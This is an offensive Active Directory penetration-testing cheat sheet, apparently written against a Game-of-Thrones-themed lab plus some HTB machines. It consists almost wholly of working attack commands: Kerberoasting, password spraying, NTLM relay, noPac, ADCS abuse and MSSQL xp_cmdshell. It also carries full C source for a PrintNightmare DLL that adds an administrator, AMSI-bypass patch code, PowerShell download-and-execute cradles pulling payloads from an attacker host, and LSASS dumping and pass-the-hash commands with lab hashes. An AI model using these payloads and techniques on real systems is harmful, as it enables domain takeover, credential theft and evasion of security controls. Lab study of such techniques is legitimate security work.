# Enumeration & setup
```
#This is a very kick way to get all the windows machine IP, names and domains.

crackmapexec smb 192.168.56.0/24
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)

# Enumerate the DCs by quering the dns with nslookup

sudo nmap -p 88 --open 192.168.56.0/24
sudo nmap -p 53 --open 192.168.56.0/24
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
nslookup -type=srv _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 192.168.56.10
nslookup -type=srv _ldap._tcp.dc._msdcs.essos.local 192.168.56.10


# setup kerberos
- configure /etc/hosts 
- install kerberos client 
`sudo apt install krb5-user`
- setup the /etc/krb5.conf file like this

[libdefaults]
  default_realm = essos.local
  kdc_timesync = 1
  ccache_type = 4
  forwardable = true
  proxiable = true
  fcc-mit-ticketflags = true
[realms]
  north.sevenkingdoms.local = {
      kdc = winterfell.north.sevenkingdoms.local
      admin_server = winterfell.north.sevenkingdoms.local
  }
  sevenkingdoms.local = {
      kdc = kingslanding.sevenkingdoms.local
      admin_server = kingslanding.sevenkingdoms.local
  }
  essos.local = {
      kdc = meereen.essos.local
      admin_server = meereen.essos.local
  }
```

# Test kerberos config 
## Get TGT 
### Note: sometimes fqdn doesn't work, just choose the hostname instead in these cases
```
getTGT.py essos.local/khal.drogo:horse
export KRB5CCNAME=khal.drogo.ccache 
GetADUsers.py -all -k  -no-pass  -dc-ip 10.10.11.187 flight.htb/svc_apache 
smbclient.py -k @braavos.essos.local
unset KRB5CCNAME

getTGT.py north.sevenkingdoms.local/arya.stark:Needle
export KRB5CCNAME=arya.stark.ccache
smbclient.py -k -no-pass @winterfell.north.sevenkingdoms.local
smbclient.py -k -no-pass @winterfell

python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py north.sevenkingdoms.local/ -usersfile users.north.sevenkingdoms.local.txt

john -w=/usr/share/wordlists/rockyou.txt brandon.stark.asrep_roasting.hash.txt

crackmapexec smb 192.168.56.11 --users
crackmapexec smb 192.168.56.11 --pass-pol

getTGT.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople

export KRB5CCNAME=brandon.stark.ccache
```
# Enumerate DC’s anonymously
```
crackmapexec smb 192.168.56.10 --users
crackmapexec smb 192.168.56.11 --users
crackmapexec smb 192.168.56.12 --users

enum4linux 192.168.56.11

rpcclient -U "NORTH\\" 192.168.56.11 -N -c 'enumdomusers'

net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
```

## Anonymously brute-force rid
```
crackmapexec smb 192.168.56.10 -u '' -p '' --rid-brute
```

# Enumerate detailed human readable DC infos in grep, json and html
```
ldapdomaindump -u 'north.sevenkingdoms.local\brandon.stark' -p 'iseedeadpeople' 192.168.56.11
ldapdomaindump -u 'north.sevenkingdoms.local\brandon.stark' -p 'iseedeadpeople' ldaps://10.10.11.202:3269
```

## Enumerate DC’s anonymously (brute force) - when anonymous sessions are not allowed
```
# First let’s create a user list:
curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > got_users.txt

# Nmap attempt
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=got_users.txt" 192.168.56.10
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=got_users.txt" 192.168.56.12


```

# List guest access on shares
```
crackmapexec smb 192.168.56.10-23 -u 'a' -p '' --shares
```
# List shares authenticated 
```
Find-DomainShare -CheckShareAccess -ErrorAction SilentlyContinue   | Where-Object {$_.Name -ne 'print$'} | select Name,ComputerName | ft -AutoSize | Out-File -Encoding utf8 NewShares.txt
Find-DomainShare -CheckShareAccess -ErrorAction SilentlyContinue   | Where-Object {$_.Name -ne 'print$' -and $_.Name -ne 'Admin$' -and $_.Name -ne 'C$' -and $_.Name -ne 'IPC$'} | select Name,ComputerName | ft -AutoSize | Out-File -Encoding utf8 NewShares.txt
crackmapexec smb 192.168.56.10-23 -u 'usernames' -p 'password' --shares
```

# Getting user credentials
## ASREP - roasting
```
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt

hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
```

## Password spray
```
#We could try the classic user=password test
crackmapexec smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
crackmapexec smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
sprayhound -U ./users.txt -d hackn.lab -dc 10.10.10.1

# Single user, single password
sprayhound -u simba -p Pentest123.. -d hackn.lab -dc 10.10.10.1

# User list, single password
sprayhound -U ./users.txt -p Pentest123.. -d hackn.lab -dc 10.10.10.1

# User as pass with password lowercase
sprayhound -U ./users.txt --lower -d hackn.lab -dc 10.10.10.1

# User as pass with password uppercase
sprayhound -U ./users.txt --upper -d hackn.lab -dc 10.10.10.1


#We could try sprayhound with a valid user to avoid locking account (option -t to set the number of try left)
sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2

#See the status of bruteforce
crackmapexec smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users

```

# User listing
```
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
python3 /opt/windapsearch/windapsearch.py -d north.sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -U 

ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))"

```

# Kerberoasting
On an active directory, we will see very often users with an SPN set.
```
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes

crackmapexec ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING

hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force

#crackmapexec smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
```

# DNS dump
```
adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local
adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local --sslprotocol TLSv1_2
```

# Bloodhound
```
#First we will get the datas with the python ingestor : https://github.com/fox-it/BloodHound.py
bloodhound.py --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local
bloodhound.py --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.local
```
## .net ingestor - from Windows
```
# The official bloudhound ingestor is sharphound : https://github.com/BloodHoundAD/SharpHound
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip


$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/SharpHound.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split())
```

## Hunting with bloodhound
```
#show all domains and computer
MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p

#show all the users
MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p

#see the overall map of domains/groups/users
MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q

#see the users ACL
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
```

# poison and relay
```
responder -I vboxnet0

hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 

rm /opt/tools/Responder/Responder.db

## hunting unsigned smb in the lab and generate a list of IP targets

crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt

#Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.
sed -i 's/HTTP = On/HTTP = Off/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = On/SMB = Off/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'SMB ='

ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks  
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 
```

## Use a socks relay with an admin account
```
proxychains secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```

## Lsassy
Lsassy allow you to dump lsass remotely, it do all the painful actions like dump and read lsass process stored credentials content for you. 
```
proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
```

## DonPapi
donPAPI, is used to get dpapi and other passwords stored informations (files, browser, schedule tasks,…). This tool don’t touch LSASS so it is stealthier and work most of the time even if av and edr are enabled on the target
```
proxychains DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```

### Code execution : smbexec or atexec
`proxychains smbexec.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug`

# Mitm6 + ntlmrelayx to ldap
- We will start mitm6 to poison dhcpv6 and get dns request from the hosts
- As a side note, i notice we can poison domain controler but after that the DC’s doesn’t care and still use their localhost dns server.
- So we must target servers
- For this example we will poison braavos server. We will answer to wpad queries and relay the http query to ldaps on meereen to add a computer with delegate access.

## start poisoning with mitm6 and start ntlmrelayx
```
mitm6 -i vboxnet0 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug

ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer hellocomputer --delegate-access

#here we assume hellocomputer has been created with password DB16}3dC7ootdSV
#Next is exploiting RBCD

getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/hellocomputer$:DB16}3dC7ootdSV'

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local

psexec.py administrator@192.168.56.22 -hashes :84fe45d7c3263065e931761aef6c7aaf
```
If this attack is succesfully achieved, we can notice that
- A new computer has been created with delegate access to Braavos$ because we poison Braavos$ computer account and it can set the msDS-AllowedToActOnBehalfOfOtherIdentity on the created computer.

- We can continue with RBCD exploitation (with getST to call s4u2proxy)

- If we specify a loot dir all the informations on the ldap are automatically dumped

`ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot`

**Another thing we could do is also relay to smb server just like responder**

# Coerced auth smb + ntlmrelayx to ldaps with drop the mic
We can coerce a connection from meereen DC to our host using multiple methods (petitpotam, printerbug, DFSCoerce). To force a coerce without choosing between the different methods, we can use the all-in-one tool who just came up coercer

**It is not possible to relay smb connection to ldap(s)** connection **without using CVE-2019-1040 a.k.a remove-mic** (en.hackndo.com/ntlm-relay)  (www.thehacker.recipes/ad/movement/ntlm/relay).
- Start the relay with remove mic to the ldaps of meereen.essos.local.
`ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access`

- Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)
`python3 coercer.py -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1`
`./Coercer.py coerce -u khal.drogo -d essos.local -t braavos.essos.local  -l 10.124.17.233`

- If the attack worked we can now exploit braavos with RBCD
`getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/removemiccomputer$:_53>W3){OkTY{ej'`

- And use that ticket to retreive secrets
```
export KRB5CCNAME=/workspace/Administrator.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
```

# AD exploit from a user 

## nopac (PAC => Proxy Auto Config ) : CVE-2021-42287.

### Scanning
```
crackmapexec smb 192.168.56.0/24  -M nopac -u 'samwell.tarly' -p 'Heartsbane'

#or 

git clone https://github.com/Ridter/noPac.git
cd noPac

python3.8 scanner.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -dc-ip 192.168.56.11

```

#### Auto exploit with nopac.py
```
python3.8 noPac.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -dc-ip 192.168.56.11

#or Auto get shell

python3.8 noPac.py  north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -dc-ip 192.168.56.11 -dc-host WINTERFELL -shell --impersonate administrator 
```

### check the machine account quota
```
cme ldap -L
cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
Get-DomainObject -Identity domain_name -Properties ms-DS-MachineAccountQuota
```

### Prepare impacket (to get rename.py)
```
cd /opt/tools
git clone https://github.com/SecureAuthCorp/impacket myimpacket

cd myimpacket
git checkout -b mydev

python3.8 -m virtualenv myimpacket
source myimpacket/bin/activate
python3.8 -m pip install .

git fetch origin pull/1224/head:1224
git fetch origin pull/1202/head:1202

git merge 1202
git merge 1224


rehash
#now rename.py and getST.py should be there
```

### Exploitation
```
#Add a new computer
addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'

#Clear the SPNs of our new compute
addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'

#Rename the computer (computer -> DC)
renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing

#Obtain a TGT
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'

#Reset the computer name back to the original name
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing

#Obtain a service ticket with S4U2self by presenting the previous TGT
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug

#DCSync by presenting the service ticket
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'


#Now clean up by deleting the computer we created with the administrator account hash we just get
addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'

```

## PrintNightmare (CVE-2021-1675)
### Check spooler is active
```
cme smb 192.168.56.10-23 -M spooler
#or
rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
```

### Exploit
`git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare`

Prepare the dll (the following code in nightmare.c) with the purpose of creating a new user named pnightmareuser
Source: https://github.com/newsoft/adduser 
```
/*
 * ADDUSER.C: creating a Windows user programmatically.
 */

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>


DWORD CreateAdminUserInternal(void)
{
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;

    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;

    DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)
    BYTE Sid[256];

    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];

    // Create user
    memset(&ud, 0, sizeof(ud));

    ud.usri1_name        = _T("pnightmareuser");                // username
    ud.usri1_password    = _T("Test123456789!");             // password
    ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
    ud.usri1_script_path = NULL;

    rc = NetUserAdd(
        NULL,            // local server
        1,                // information level
        (LPBYTE)&ud,
        NULL            // error value
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

   _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);

    // Get user SID
    b = LookupAccountName(
        NULL,            // local server
        ud.usri1_name,   // account name
        Sid,             // SID
        &cbSid,          // SID size
        Domain,          // Domain
        &cbDomain,       // Domain size
        &snu             // SID_NAME_USE (enum)
    );

    if (!b) {
        dw = GetLastError();
        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
        return dw;
    }

    // Add user to "Administrators" local group
    memset(&gd, 0, sizeof(gd));

    gd.lgrmi0_sid = (PSID)Sid;

    rc = NetLocalGroupAddMembers(
        NULL,                    // local server
        _T("Administrators"),
        0,                        // information level
        (LPBYTE)&gd,
        1                        // only one entry
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

    return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateAdminUserInternal();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// RUNDLL32 entry point
#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

// Command-line entry point.
int main()
{
    return CreateAdminUserInternal();
}

```
Compile it
`x86_64-w64-mingw32-gcc -shared -o pnightmare2.dll nightmare.c -lnetapi32
`

#Prepare a smb share with the dll
```
smbserver.py -smb2support ATTACKERSHARE .

#exploit cve
python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
```

# vulnerability check
```
# zerologon
crackmapexec smb 192.168.56.12  -M zerologon
#nopac
crackmapexec smb 192.168.56.0/24  -M nopac -u 'samwell.tarly' -p 'Heartsbane'
```
# ADCS
## Installation of certify-ad
```
git clone https://github.com/f3rn0s/Certipy
cd Certipy
python -m venv venv
source venv/bin/activate
pip3 install .
```

## Enumeration 
```
certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -stdout
certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -enabled -stdout

getTGT.py sequel.htb/Ryan.Cooper:horse
export KRB5CCNAME=khal.drogo.ccache 
certipy-ad find -u Ryan.Cooper@sequel.htb  -k -no-pass  -vulnerable -stdout -ns 10.127.14.70 -target COB3DC.sequel.htb  -debug
```

## Exploitation 
### ESC1
```
certipy-ad req -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn Administrator@sequel.htb 
sudo ntpdate 10.10.11.202
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.202
```
### ESC7
**Perquisites**
- ManageCA permission

**TODO**
- Grant Manage Certificates permission with ManageCA
- Enable SubCA template (which is vulnerable to ESC1)
- Exploit

**Process**
Grant yourself the Manage Certificates access right by adding your user as a new officer.
```
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
```
Enable SubCA template (enabled by default)
```
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
```
Request a certificate based on the SubCA template (which should failed a provide request ID)
```
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
```
Issue the failed certificate request 
```
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
```
Retrieve the issued certificate 
```
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
```
Authenticate with the certificate
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236 
```

# MSSQL
## Enumeration
```
GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
nmap -p 1433 -sV -sC 192.168.56.10-23
crackmapexec mssql 192.168.56.22-23

crackmapexec mssql 192.168.56.22 -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
```

## Connect to mssql
```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local

# Enumerate user of server 
enum_logins

# Enumerate user of database
enum_users

## Enumerate login with impersonation permission
enum_impersonate

## Impersonation
exec_as_login sa
enable_xp_cmdshell
xp_cmdshell whoami

## Enumerate as login sa
enum_logins
enum_impersonate

## Impersonate - execute as user
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local
use master
execute as user = "dbo"
exec master..xp_cmdshell 'whoami'

```

By executing as user, the database should have trustworthy property set in order to run shell. In order to enumerate trustworthy property in database run:
`enum_db`

```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local
use msdb
exec_as_user dbo
enable_xp_cmdshell
xp_cmdshell whoami
```

## Coerce and relay
start responder  or ntlm-relat
```
responder -I vboxnet0

ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks  
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 
```

connect and run xp_dirtree command
```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/hodor:hodor@castelblack.north.sevenkingdoms.local
exec master.sys.xp_dirtree '\\192.168.56.1\demontlm',1,1
```

## trusted links
```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/jon.snow:iknownothing@castelblack.north.sevenkingdoms.local -show
enum_links

EXEC sp_linkedservers
EXEC sp_helplinkedsrvlogin


use_link BRAAVOS
enable_xp_cmdshell
xp_cmdshell whoami

```

# Privesc
## Disable AMSI
https://amsi.fail/

### Bypass at .net AMSI level 
https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/

```
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

```
## Common Binary in memory
https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master 
## WinPeas without touching disk
```
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/winPEASany_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```

If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use PowerSharpPack and get everything done for you (thanks again to @ShitSecure).
```
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1')
PowerSharpPack -winPEAS
```

### Exploit SeImpersonatePrivilege
```
echo "@echo off" > runme.bat
echo "start /b C:\Windows\system32\mshta.exe http://10.10.14.194:8000/hello.hta" >> runme.bat
echo "exit /b" >> runme.bat

mkdir c:\temp
cd c:\temp
(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8080/runme.bat','C:\Windows\Temp\runme.bat')
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/SweetPotato.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[SweetPotato.Program]::Main(@('-p=C:\Windows\Temp\runme.bat'));[Console]::SetOut($out);$sWriter.ToString()

or

	

$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
iex(new-object system.net.webclient).downloadstring('http://192.168.56.1:8080/amsi_rmouse.txt')
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1')
Invoke-BadPotato -Command "c:\temp\runme.bat"

```

# Lateral movement
## DonPAPI
```
DonPAPI.py domain/user:passw0rd@target
DonPAPI.py --hashes <LM>:<NT> domain/user@target
DonPAPI.py -k domain/user@target
DonPAPI.py -local_auth user@target
```
## secretsdump & crackmapexec
```
python3 secretsdump.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 

#Password reuse and PTH attack
crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'
```
##  Cached domain logon information
```
reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\share'

secretsdump -security SECURITY.save -system SYSTEM.save LOCAL
```

## LSASS
```
lsassy -d north.sevenkingdoms.local -u jeor.mormont -p _L0ngCl@w_ 192.168.56.22 -m dumpertdll -O dumpertdll_path=/workspace/Outflank-Dumpert-DLL.dll

ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
export KRB5CCNAME=ccache_ticket.ccache
wmiexec.py -k -no-pass north.sevenkingdoms.local/jeor.mormont
```

## Lateral Move with impacket
```
psexec -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
wmiexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
smbexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
atexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
dcomexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
```

## Other method
```
cme smb 192.168.56.11 -H ':cba36eccfd9d949c73bc73715364aff5' -d 'north' -u 'catelyn.stark' -x whoami
evil-winrm -i 192.168.56.11 -u catelyn.stark -H 'cba36eccfd9d949c73bc73715364aff5'

# Allow to RDP without password
reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' 
